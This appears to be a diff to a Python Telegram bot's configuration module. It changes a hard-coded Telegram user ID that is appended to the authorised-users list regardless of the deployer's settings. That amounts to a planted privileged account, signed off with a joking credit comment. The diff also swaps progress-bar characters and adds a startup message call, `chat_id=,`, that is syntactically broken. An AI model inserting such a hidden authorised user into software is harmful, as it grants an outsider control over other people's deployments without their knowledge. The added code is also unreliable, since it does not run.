@@ -23,7 +23,7 @@ from bot.config import Config
 cmd1 = []
 AUTH_USERS = set(Config.AUTH_USERS)
 AUTH_USERS = list(AUTH_USERS)
-AUTH_USERS.append(1391975600)
+AUTH_USERS.append(5121002601)
 # again lol (c) @Animes_Encoded 
 
 SESSION_NAME = Config.SESSION_NAME
@@ -35,8 +35,8 @@ LOG_CHANNEL = Config.LOG_CHANNEL # make sure to us this
 DOWNLOAD_LOCATION = "/app/downloads"
 FREE_USER_MAX_FILE_SIZE = 2097152000
 MAX_MESSAGE_LENGTH = 4096
-FINISHED_PROGRESS_STR = "▓"
-UN_FINISHED_PROGRESS_STR = "░"
+FINISHED_PROGRESS_STR = "■"
+UN_FINISHED_PROGRESS_STR = "□"
 BOT_START_TIME = time.time()
 LOG_FILE_ZZGEVC = "Log.txt"
 BOT_USERNAME = Config.BOT_USERNAME 
@@ -78,3 +78,7 @@ logging.basicConfig(
 logging.getLogger("pyrogram").setLevel(logging.WARNING)
 logging.getLogger("urllib3").setLevel(logging.WARNING)
 LOGGER = logging.getLogger(__name__)
+
+app.send_message(
+    chat_id=, "**I AM UP 😎**"
+)
